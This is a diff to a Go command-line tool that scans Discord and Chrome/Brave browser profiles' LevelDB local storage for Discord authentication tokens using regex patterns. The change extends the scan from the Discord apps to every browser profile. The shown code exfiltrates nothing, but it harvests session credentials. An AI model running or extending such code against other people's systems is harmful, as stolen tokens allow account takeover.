@@ -49,10 +49,9 @@ gdtg search all`,
 		paths := map[string]string{
 			"Discord":        configFolder + "discord",
 			"Discord Canary": configFolder + "discordcanary",
-			//TODO how to handle profiles for browsers
-			/* "Google Chrome":  configFolder + "google-chrome",
-			"Brave":         configFolder + "BraveSoftware/Brave-Browser",
-			"Brave Nightly": configFolder + "BraveSoftware/Brave-Browser-Nightly", */
+			"Google Chrome":  configFolder + "google-chrome",
+			"Brave":          configFolder + "BraveSoftware/Brave-Browser",
+			"Brave Nightly":  configFolder + "BraveSoftware/Brave-Browser-Nightly",
 		}
 
 		if args[0] == "all" {
@@ -109,46 +108,76 @@ func getTokens(paths map[string]string) (map[string][]string, error) {
 	fmt.Println("Searching tokens...")
 
 	for key, path := range paths {
-		path = filepath.Join(path, "Local Storage", "leveldb")
-		var tokensForPath []string
-
-		files, err := os.ReadDir(path)
-		if err != nil {
-			return nil, err
-		}
-
-		for _, file := range files {
-			fileName := file.Name()
-			if !strings.HasSuffix(fileName, ".log") && !strings.HasSuffix(fileName, ".ldb") {
-				continue
-			}
-
-			content, err := os.ReadFile(filepath.Join(path, fileName))
+		if strings.Contains(key, "Google Chrome") || strings.Contains(key, "Brave") {
+			// Handle browser profiles
+			profiles, err := os.ReadDir(path)
 			if err != nil {
 				return nil, err
 			}
 
-			lines := strings.Split(string(content), "\n")
-
-			for _, line := range lines {
-				line = strings.TrimSpace(line)
-				if line == "" {
+			for _, profile := range profiles {
+				if !profile.IsDir() {
 					continue
 				}
 
-				for _, regex := range []string{`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`, `mfa\.[\w-]{84}`} {
-					r := regexp.MustCompile(regex)
-					matches := r.FindAllString(line, -1)
-					for _, match := range matches {
-						if !contains(tokensForPath, match) {
-							tokensForPath = append(tokensForPath, match)
-						}
+				profilePath := filepath.Join(path, profile.Name(), "Local Storage", "leveldb")
+				tokensForProfile, err := searchTokensInPath(profilePath)
+				if err != nil {
+					continue // If we can't read a profile directory, skip it
+				}
+				tokens[key+" - "+profile.Name()] = tokensForProfile
+			}
+		} else {
+			// Handle Discord and Discord Canary
+			path = filepath.Join(path, "Local Storage", "leveldb")
+			tokensForApp, err := searchTokensInPath(path)
+			if err != nil {
+				return nil, err
+			}
+			tokens[key] = tokensForApp
+		}
+	}
+
+	return tokens, nil
+}
+
+func searchTokensInPath(path string) ([]string, error) {
+	var tokens []string
+
+	files, err := os.ReadDir(path)
+	if err != nil {
+		return nil, err
+	}
+
+	for _, file := range files {
+		fileName := file.Name()
+		if !strings.HasSuffix(fileName, ".log") && !strings.HasSuffix(fileName, ".ldb") {
+			continue
+		}
+
+		content, err := os.ReadFile(filepath.Join(path, fileName))
+		if err != nil {
+			return nil, err
+		}
+
+		lines := strings.Split(string(content), "\n")
+
+		for _, line := range lines {
+			line = strings.TrimSpace(line)
+			if line == "" {
+				continue
+			}
+
+			for _, regex := range []string{`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`, `mfa\.[\w-]{84}`} {
+				r := regexp.MustCompile(regex)
+				matches := r.FindAllString(line, -1)
+				for _, match := range matches {
+					if !contains(tokens, match) {
+						tokens = append(tokens, match)
 					}
 				}
 			}
 		}
-
-		tokens[key] = tokensForPath
 	}
 
 	return tokens, nil
